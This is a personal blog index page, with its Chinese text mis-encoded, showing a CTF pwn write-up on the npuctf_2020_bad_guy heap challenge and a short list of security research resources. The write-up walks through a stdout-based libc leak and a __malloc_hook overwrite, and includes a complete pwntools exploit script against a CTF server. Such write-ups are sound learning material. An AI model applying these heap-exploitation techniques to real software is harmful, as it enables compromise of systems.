<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>å”ä»”æ©™</title><meta name="author" content="å”ä»”æ©™,tangzicheng233@gmail.com"><meta name="copyright" content="å”ä»”æ©™"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="å–œæ¬¢æ¢ç´¢ä¸–ç•Œ,åœ¨è¯»ç ”ç©¶ç”Ÿ,è®¡ç®—æœºçˆ±å¥½è€…çš„æˆé•¿è®°å½•">
<meta property="og:type" content="website">
<meta property="og:title" content="å”ä»”æ©™">
<meta property="og:url" content="https://tangzichengcc.github.io/page/2/index.html">
<meta property="og:site_name" content="å”ä»”æ©™">
<meta property="og:description" content="å–œæ¬¢æ¢ç´¢ä¸–ç•Œ,åœ¨è¯»ç ”ç©¶ç”Ÿ,è®¡ç®—æœºçˆ±å¥½è€…çš„æˆé•¿è®°å½•">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://tangzichengcc.github.io/img/profile.png">
<meta property="article:author" content="å”ä»”æ©™">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://tangzichengcc.github.io/img/profile.png"><link rel="shortcut icon" href="/img/favicon.webp"><link rel="canonical" href="https://tangzichengcc.github.io/page/2/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="MTZmw-Jp9gUmwt4q-TLzEzI1_TFDA2QpQLuyUeOqzk4"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹ï¼š${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'å¤©',
  date_suffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: {"limitCount":500,"languages":{"author":"ä½œè€…: å”ä»”æ©™","link":"é“¾æ¥: ","source":"æ¥æº: å”ä»”æ©™","info":"è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'å”ä»”æ©™',
  isPost: false,
  isHome: true,
  isHighlightShrink: false,
  isToc: false,
  postUpdate: '2024-01-28 23:27:56'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/profile.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">82</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">13</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> å½’æ¡£</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> å‹é“¾</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> å…³äº</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url('/img/index_img.gif')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">å”ä»”æ©™</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> æœç´¢</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> å½’æ¡£</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> å‹é“¾</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> å…³äº</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">å”ä»”æ©™</h1><div id="site-subtitle"><span id="subtitle"></span></div><div id="site_social_icons"><a class="social-icon" href="https://github.com/tangzichengcc" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-44-houseofroman/" title="pwnå…¥é—¨-44-houseofroman">pwnå…¥é—¨-44-houseofroman</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2023-10-25T08:58:22.000Z" title="å‘è¡¨äº 2023-10-25 16:58:22">2023-10-25</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2023-11-03T09:38:41.825Z" title="æ›´æ–°äº 2023-11-03 17:38:41">2023-11-03</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWNå…¥é—¨</a></span></div><div class="content">â€‹	åœ¨ä¸€æ¬¡æ¯”èµ›ä¸­é‡åˆ°äº†å †é¢˜,æ²¡æœ‰showå‡½æ•°,æ‡µé€¼äº†â€¦å½“æ—¶æœ‰ç•¥è¿‡ä¸€ä¸æ€è·¯é€šè¿‡io stdoutè¾“å‡º,ä½†å¥ˆä½•è¿™æ–¹é¢çŸ¥è¯†äº†è§£è¿˜ä¸å¤š(ä¸è¿‡ç¡®å®å¯ä»¥é€šè¿‡æœç´¢å¼•æ“ æœç´¢å…³é”®å­—æ¥æ‰¾åˆ°è¿™ç§æ‰‹æ³•)
â€‹	(åæ¥å‘ç°è¿™æ˜¯nå¹´å‰çš„æ‰‹æ³•äº†ğŸ˜­, 
ä¾‹é¢˜npuctf_2020_bad_guy
é¢˜ç›®åˆ†æç»å…¸èœå•å †,ä½†æ˜¯æ²¡æœ‰show
1234567891011121314151617181920212223242526272829303132333435363738394041int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  int num; // eax  prog_init(argc, argv, envp);  while ( 1 )  &#123;    while ( 1 )    &#123;      puts(&quot;=== Bad Guy ===&quot;);      puts(&quot;1. Malloc&quot;);      puts(&quot;2. Edit&quot;);      puts(&quot;3. Free&quot;);      printf(&quot;&gt;&gt; &quot;);      num = read_num();      if ( num != 2 )        break;      edit();    &#125;    if ( num &gt; 2 )    &#123;      if ( num == 3 )      &#123;        delete();      &#125;      else      &#123;        if ( num == 4 )          exit(0);LABEL_13:        puts(&quot;2333, Bad Guy!&quot;);      &#125;    &#125;    else    &#123;      if ( num != 1 )        goto LABEL_13;      add();    &#125;  &#125;&#125;

ç»“æ„ä½“1234struct &#123;    int size;    char *content;&#125; heaparray;

add12345678910111213141516171819ssize_t add()&#123;  unsigned __int64 num; // [rsp+0h] [rbp-10h]  __int64 size; // [rsp+8h] [rbp-8h]  printf(&quot;Index :&quot;);  num = read_num();  printf(&quot;size: &quot;);  size = read_num();  *((_QWORD *)&amp;heaparray + 2 * num + 1) = malloc(size);  if ( !*((_QWORD *)&amp;heaparray + 2 * num + 1) || num &gt; 0xA )  &#123;    puts(&quot;Bad Guy!&quot;);    exit(1);  &#125;  *((_QWORD *)&amp;heaparray + 2 * num) = size;  printf(&quot;Content:&quot;);  return read(0, *((void **)&amp;heaparray + 2 * num + 1), size);&#125;

heaparrayæ˜¯å­˜æ”¾åˆ†é…å †å—çš„æŒ‡é’ˆçš„
1234pwndbg&gt; tele 0x55555560204000:0000â”‚  0x555555602040 (heaparray) â—‚â€” 0x1401:0008â”‚  0x555555602048 (heaparray+8) â€”â–¸ 0x555555400ced (add+92) â—‚â€” mov rdx, qword ptr [rbp - 0x10]02:0010â”‚  0x555555602050 (heaparray+16) â—‚â€” 0x0



deletefreeè¿‡å ä¹Ÿç½®0äº†
å¦‚æœä¸ç½®0,é‚£freeæ˜¯å¹²äº†ä»€ä¹ˆ..æˆ‘è®°å¾—æ˜¯..
12345678910111213141516171819int delete()&#123;  _QWORD *v0; // rax  unsigned __int64 num; // [rsp+8h] [rbp-8h]  printf(&quot;Index :&quot;);  num = read_num();  if ( *((_QWORD *)&amp;heaparray + 2 * num + 1) || num &gt; 0xA )  &#123;    free(*((void **)&amp;heaparray + 2 * num + 1));    v0 = (_QWORD *)((char *)&amp;heaparray + 16 * num + 8);    *v0 = 0LL;  &#125;  else  &#123;    LODWORD(v0) = puts(&quot;Bad Guy!&quot;);  &#125;  return (int)v0;&#125;



edit1234567891011121314151617181920int edit()&#123;  unsigned __int64 num; // [rsp+0h] [rbp-10h]  __int64 nbytes; // [rsp+8h] [rbp-8h]  if ( count &lt;= 0 )  &#123;    puts(&quot;Bad Guy!&quot;);    exit(1);  &#125;  --count;  printf(&quot;Index :&quot;);  num = read_num();  printf(&quot;size: &quot;);  nbytes = read_num();  if ( !*((_QWORD *)&amp;heaparray + 2 * num + 1) || num &gt; 9 )    return puts(&quot;Bad Guy!&quot;);  printf(&quot;content: &quot;);  return read(0, *((void **)&amp;heaparray + 2 * num + 1), nbytes);&#125;



è¿™é‡Œæ˜¯æ¼æ´ç‚¹,å¯ä»¥è¯»å…¥ä»»æ„çš„å¤§å°
alarm æŠŠå€¼ç»™æ”¹äº†
123456789pwndbg&gt; niProgram received signal SIGALRM, Alarm clock.0x0000555555400ced in add ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATAâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS / show-flags off / show-compact-regs off ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€*RAX  0x555555602040 (heaparray) â—‚â€” 0x0 RBX  0x0*RCX  0x555555400ced (add+92) â—‚â€” mov rdx, qword ptr [rbp - 0x10]



123456unsigned int prog_init()&#123;  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  return alarm(0x3Cu);&#125;



æ€è·¯å¼€äº†pie,åº”è¯¥å…ˆæƒ³åŠæ³•æ³„æ¼åœ°å€,ç„¶åç”¨onegadgetè¦†ç›–malloc_hookç­‰å³å¯
æ³„éœ²åœ°å€â€‹	åˆ©ç”¨io stdoutè¿›è¡Œæ³„æ¼ã€(å‰æœŸæ–¹ä¾¿è°ƒè¯•å¯ä»¥æœ¬åœ°å…ˆå…³é—­alsr)
â€‹	å…·ä½“æ¥è¯´,è¦æ„é€ å †å—é‡å (ç±»ä¼¼double freeæ„Ÿè§‰?å¦‚æœä¸å¤Ÿé€ ä½†æ˜¯å¯ä»¥ç›´æ¥ä¿®æ”¹åœ°å€å—ä¸æ˜¯), ä¿®æ”¹_IO_2_1_stdout _çš„flagså€¼(åŸç†åœ¨æœ€å) ,ç„¶åå°±å¯ä»¥æ³„éœ²åœ°å€äº†
â€‹	æ„é€ å››ä¸ªå †å—,freeæ‰0x60çš„2å·,ç„¶ååˆ©ç”¨editçš„æ¼æ´æŠŠ1å¤§å°æ”¹ä¸º0x90,ç„¶åé‡Šæ”¾,ç„¶åé€šè¿‡mallocä¸€ä¸ª0x10å¤§å°å †å—,ä½¿å¾—å‰©ä½™çš„å †å—ä¸é‡Šæ”¾çš„2å·å †å—é‡å 
â€‹	é‡å çš„ç›®çš„æ˜¯æŠŠunsortedbinçš„fdçš„åœ°å€æ”¾åˆ°fastbinåœ°å€é‚£é‡Œ,è®©fastbinèƒ½åˆ©ç”¨è¿™ä¸ªåœ°å€è¿›è¡Œç”³è¯·
123456789101112malloc(0,0x10)   malloc(1,0x10)   malloc(2,0x60)   malloc(3,0x10)   free(2)   payload = p64(0)*3 + p64(0x91)# + p64(0) * 3 + p64(0x91)   edit(0,len(payload),payload)   free(1)   #pause()   malloc(4,0x10)   #pause()

â€‹	æ²¡æœ‰malloc 0x10å‰,å¯ä»¥çœ‹åˆ°fastbinçš„ä½ç½®,ä»¥åŠå®ƒçš„fdæ˜¯æ²¡æœ‰å€¼çš„

â€‹	mallocå

â€‹	å°†åå››å­—èŠ‚ä¿®æ”¹ä¸º0x255ï¼Œç„¶åmallocä¸¤æ¬¡å°±å¯ä»¥åˆ†åˆ°_IO_2_1_stdout _ä¸Šé¢çš„ä½ç½®,ä¹‹æ‰€ä»¥è¦åˆ†é…0x25ddé‚£é‡Œ,æ˜¯å› ä¸ºè¦æ»¡è¶³å †çš„å¤§å°æ£€æŸ¥è¦æ±‚
1234567payload = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x71) + p16(0x25dd) #* 3 + p64(0x91)   edit(0,len(payload),payload)   #pause()   malloc(5,0x60)   #pause()   payload = 0x33 * p8(0) + p64(0xfbad800) + p64(0)*3 + p8(0)   malloc(6,0x60,payload)


â€‹	ä¸æ»¡è¶³è¦æ±‚çš„è¯ä¼šæŠ¥é”™ Error in &#96;.&#x2F;npuctf_2020_bad_guyâ€™: malloc(): memory corruption (fast): 0x00007ffff7dd25f5 ,è¿™ä¸€å—ç­‰åˆ†ææºç çš„æ—¶å€™å†ç»†çœ‹
â€‹	mallocå®Œä¹‹å,_IO_2_1_stdoutçš„flagså°±è¢«ä¿®æ”¹äº†ï¼Œ ä¹Ÿå°±æ˜¯è¦ä¿®æ”¹å¯¹åº”flagçš„å€¼ å’Œ _IO_write_base, _IO_write_ptr, _IO_write_endç­‰ å°±ä¼šè‡ªåŠ¨è¾“å‡ºç¼“å­˜åŒºçš„ä¿¡æ¯??????

â€‹	ç„¶åå°±ä¼šæ³„éœ²libcåœ°å€äº†,æ³„æ¼çš„åœ°å€æ˜¯å¤šå°‘å‘¢,æ˜¯0x7ffff7dd2600,ä¸ºå•¥å‘¢?,å‡å»åç§»å°±å¾—åˆ°äº†åŸºå€
 payload &#x3D; 0x33 * p8(0) + p64(0xfbad800) + p64(0)*3 + p8(0)
(0x33 &#x3D; 51  &#x3D; 6*8 + 3)   + 2  *  8 +1    &#x3D; 8 * 8 + 4
ä» 0xedé‚£é‡Œå¼€å§‹è¾“å…¥æ•°æ®, 0x33 * p8(0)  &#x3D; 51, è€Œ0x2620-0x25edæ­£å¥½æ˜¯51
æ•…ä¼é‡æ¼”,æ›¿æ¢malloc_hookä¸ºonegadgetâ€‹	æ­¤æ—¶å †çš„å¸ƒå±€çš„è¯,è¿˜æœ‰ä¸€ä¸ª0x60å¤§å°çš„unsortedbin, åˆ†äº†å†freeæ”¾è¿›fastbin, æ­¤æ—¶æœ‰åœ°å€äº†,å°±ä¸éœ€è¦é‚£ä¹ˆéº»çƒ¦å†åˆ©ç”¨unsortedbinçš„åœ°å€äº†,ç›´æ¥editä¿®æ”¹å°±å¯ä»¥äº†,ç„¶åä¸¤æ¬¡mallocæŠŠ__malloc_hooké‚£é‡Œæ”¹ä¸ºonegadget
12345678malloc(7,0x60)   #pause()   free(7)   payload = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x71) + p64(libc.symbols[&#x27;__malloc_hook&#x27;] - 0x23) #* 3 + p64(0x91)   edit(0,len(payload),payload)   malloc(8,0x60)   payload = 0x13 * p8(0) + p64(libc.offset_to_vaddr(one[3]))   malloc(9,0x60,payload)



å¦‚ä½•å¼€å¯äº†alsr å¦‚ä½•çˆ†ç ´å‘¢â€‹	å­¦åˆ°äº†, è¿™æ ·è·å–é”™è¯¯, ä»¥å‰è‡ªå·±å†™å¾ªç¯tryexceptè¿™é‡Œä¸€ç›´æœ‰é—®é¢˜,å›å¤´å¯ä»¥è¯•è¯•ç”¨è¿™é‡Œçš„æ˜¯å¦å¯ä»¥
123456789101112while 1:    try:        pwn()        break    except KeyboardInterrupt:        p.close()        p = remote(&quot;node4.buuoj.cn&quot;,&quot;27593&quot;)        #p = process(binary)    except :        p.close()        #p = process(binary)        p = remote(&quot;node4.buuoj.cn&quot;,&quot;27593&quot;)



æšä¸¾çš„è¯, ä¸ç”¨å¢åŠ ç‚¹åç§»å—, æˆ–è€…è¯´åç§»ä¹Ÿæœ‰å¯èƒ½æ˜¯0?
ä¸€äº›ç»†èŠ‚libcçš„ç‰ˆæœ¬â€‹	åšé¢˜çš„è¯æ³¨æ„ä¸€ä¸‹ç‰ˆæœ¬,buuctfç”¨çš„æ˜¯2.23-0ubuntu11_amd64,è¿™ä¸ªç‰ˆæœ¬æˆ‘åœ¨ç½‘ä¸Šæ²¡æ‰¾åˆ°,æ‰¾åˆ°çš„æ²¡ç¬¦å·,è‡ªå·±ç¼–è¯‘çš„è¿˜æŠ¥é”™(ç”¨ubuntu20ç¼–è¯‘çš„,ä¸çŸ¥é“16æ˜¯ä¸æ˜¯å¯ä»¥)
â€‹	ä¸åŒç‰ˆæœ¬åç§»ä¸ä¸€æ ·
â€‹	ä½†æ˜¯é‚£ä¸ª2.23- å¤šå°‘æ˜¯ä¸€æ ·çš„
expç”¨çš„è¿™ä½å¸ˆå‚…çš„: https://blog.csdn.net/csdn546229768/article/details/123717993
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130#! /usr/bin/pythonfrom pwn import *#import syscontext.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;SigreturnFrame(kernel = &#x27;amd64&#x27;)binary = &quot;./npuctf_2020_bad_guy&quot;one = [0x45226,0x4527a,0xf03a4,0xf1247]  #2.23-0ubuntu11.3#one = [0x45216,0x4526a,0xf02a4,0xf1147] # buuctf#idx = int(sys.argv[1])global plocal = 1if local:    p = process(binary)    #gdb.attach(p)    e = ELF(binary)    libc = e.libcelse:    p = remote(&quot;node4.buuoj.cn&quot;,&quot;27593&quot;)    e = ELF(binary)    #libc = e.libc    libc = ELF(&#x27;./libc-2.23.buu.so&#x27;)################################ Condfig ############################################sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sa = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)it = lambda :p.interactive()def z(s=&#x27;b main&#x27;):    gdb.attach(p,s)def logs(mallocr,string=&#x27;logs&#x27;):    if(isinstance(mallocr,int)):       print(&#x27;\033[1;31;40m%20s--&gt;0x%x\033[0m&#x27;%(string,mallocr))    else:       print(&#x27;\033[1;31;40m%20s--&gt;%s\033[0m&#x27;%(string,mallocr))def pa(s=&#x27;1&#x27;):    log.success(&#x27;pause : step---&gt; &#x27;+str(s))    pause()def info(data,key=&#x27;info&#x27;,bit=64):    if(bit == 64):      leak = u64(data.ljust(8, b&#x27;\0&#x27;))    else:      leak = u32(data.ljust(4, b&#x27;\0&#x27;))    logs(leak,key)    return leak################################ Function ############################################def malloc(i,s,c = &#x27;A&#x27;):    sla(&#x27;&gt;&gt; &#x27;,&#x27;1&#x27;)    sla(&#x27;Index :&#x27;,str(i))    sla(&#x27;size:&#x27;,str(s))    sa(&#x27;Content:&#x27;,c)def edit(i,s,c = &#x27;A&#x27;):    sla(&#x27;&gt;&gt; &#x27;,&#x27;2&#x27;)    sla(&#x27;Index :&#x27;,str(i))    sla(&#x27;size:&#x27;,str(s))    sa(&#x27;content:&#x27;,c)def free(i):    sla(&#x27;&gt;&gt; &#x27;,&#x27;3&#x27;)    sla(&#x27;Index :&#x27;,str(i))################################### Statr ############################################def pwn():    malloc(0,0x10)    malloc(1,0x10)    malloc(2,0x60)    malloc(3,0x10)    free(2)    payload = p64(0)*3 + p64(0x91)# + p64(0) * 3 + p64(0x91)    edit(0,len(payload),payload)    free(1)    malloc(4,0x10)    payload = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x71) + p16(0x25dd) #* 3 + p64(0x91)    edit(0,len(payload),payload)    #pause()    malloc(5,0x60)    payload = 0x33 * p8(1) + p64(0xfbad800) + p64(0)*3 + p8(0)    #pause()    malloc(6,0x60,payload)    #pa()    #libc.address = info(ru(&#x27;\x7f&#x27;)[-6:]) - (0x7ffff7dd2600 - 0x7ffff7a0d000)    #libc.address = info(ru(&#x27;\x7f&#x27;)[-6:])    #print(hex(libc.address))    libc.address = info(ru(&#x27;\x7f&#x27;)[-6:]) - (0x7ffff7dd2600 - 0x7ffff7a0d000)    print(hex(libc.address))    #pause()    malloc(7,0x60)    #pause()    free(7)    #pause()    payload = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x71) + p64(libc.symbols[&#x27;__malloc_hook&#x27;] - 0x23) #* 3 + p64(0x91)    #pause()    edit(0,len(payload),payload)    malloc(8,0x60)    payload = 0x13 * p8(0) + p64(libc.offset_to_vaddr(one[3]))    malloc(9,0x60,payload)    #pause()    sla(&#x27;&gt;&gt; &#x27;,&#x27;1&#x27;)    sla(&#x27;Index :&#x27;,str(10))    sla(&#x27;size:&#x27;,str(10))    p.interactive()################################### End ##############################################pwn()p.close()&#x27;&#x27;&#x27;while 1:    try:        pwn()        break    except KeyboardInterrupt:        p.close()        p = remote(&quot;node4.buuoj.cn&quot;,&quot;27593&quot;)        #p = process(binary)    except :        p.close()        #p = process(binary)        p = remote(&quot;node4.buuoj.cn&quot;,&quot;27593&quot;)        &#x27;&#x27;&#x27;



å‚è€ƒhttps://blog.csdn.net/u014377094/article/details/124577350
https://blog.csdn.net/csdn546229768/article/details/123717993
IO_stdoutæ³„æ¼libc
pwndbg: parseheap
https://zhuanlan.zhihu.com/p/320151545 è¿™ä¸ªè›®è¯¦ç»†çš„
https://blog.csdn.net/zzq487782568/article/details/123773034 è¿™ä¸ªæ•´ä½“æ€è·¯å¯ä»¥ åˆ©ç”¨unstortedbinæ‰“stdoutæ³„éœ²å‡ºlibc
https://www.cnblogs.com/LynneHuan/p/14851770.html
https://j-kangel.github.io/2020/03/13/åˆ©ç”¨-IO-2-1-stdout-æ³„æ¼libc/#åˆ†æ
é—ç•™é—®é¢˜ä¸ºä»€ä¹ˆåæ¥åˆ†é…çš„ malloc(4,0x10)çš„fdå’Œntæ˜¯é‚£ä¸ªå€¼å‘¢ï¼Ÿ
æšä¸¾çš„è¯, ä¸ç”¨å¢åŠ ç‚¹åç§»å—, æˆ–è€…è¯´åç§»ä¹Ÿæœ‰å¯èƒ½æ˜¯0?
pwndbg: parseheap
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E7%BD%91%E5%AE%89%E5%9B%9B%E5%A4%A7%E9%A1%B6%E4%BC%9A%E5%8F%8A%E7%A7%91%E7%A0%94%E5%89%8D%E6%B2%BF%E8%B5%84%E6%BA%90%E6%95%B4%E7%90%86/" title="ç½‘å®‰å››å¤§é¡¶ä¼šåŠç§‘ç ”å‰æ²¿èµ„æºæ•´ç†">ç½‘å®‰å››å¤§é¡¶ä¼šåŠç§‘ç ”å‰æ²¿èµ„æºæ•´ç†</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2023-10-20T06:59:53.000Z" title="å‘è¡¨äº 2023-10-20 14:59:53">2023-10-20</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2024-01-21T10:51:45.469Z" title="æ›´æ–°äº 2024-01-21 18:51:45">2024-01-21</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E7%A7%91%E7%A0%94-%E5%B9%B6%E6%B2%A1%E6%9C%89/">ç§‘ç ”(å¹¶æ²¡æœ‰)</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E8%AE%BA%E6%96%87/">è®ºæ–‡</a></span></div><div class="content">ç ”ä¸€è¯»äº†ä¸€ç‚¹è®ºæ–‡,ç ”äºŒå¼€å§‹è¯»çš„å°‘äº†,æ¯•ç«Ÿæ˜¯ä¸“ç¡•â€¦â€¦â€¦. ä¸è¿‡å¥½æ­¹æ˜¯å­¦ä¹ åˆ°äº†ä¸€ç‚¹ä¸œè¥¿,è§‰å¾—æœ‰å¿…è¦æ•´ç†ä¸€ä¸‹,å°†æ¥è‚¯å®šè¿˜ä¼šç”¨åˆ°.
ç§‘ç ” https://www.aminer.cn è¿™ç§é›†åˆç½‘ç«™,å¯ä»¥æŒ‰ç…§è®ºæ–‡ç­‰çº§ç­‰æœç´¢,æŒºå¥½ç”¨çš„
é¡¶ä¼šè®ºæ–‡,å…¶ä»–CCFç±»è®ºæ–‡
è®ºæ–‡å¯»æ‰¾æ–¹å¼, ä¸‹è½½æ–¹å¼  çŸ¥ç½‘ scihubã€  ä¸­æ–‡æœŸåˆŠ
å…¶ä»– åƒ blackhatç­‰ä¼šè®®
è®ºæ–‡çŸ¥è¯†å›¾è°±
dblp
å›½å¤–å‡ å¤§å‡ºç‰ˆç¤¾
https://arxiv.org
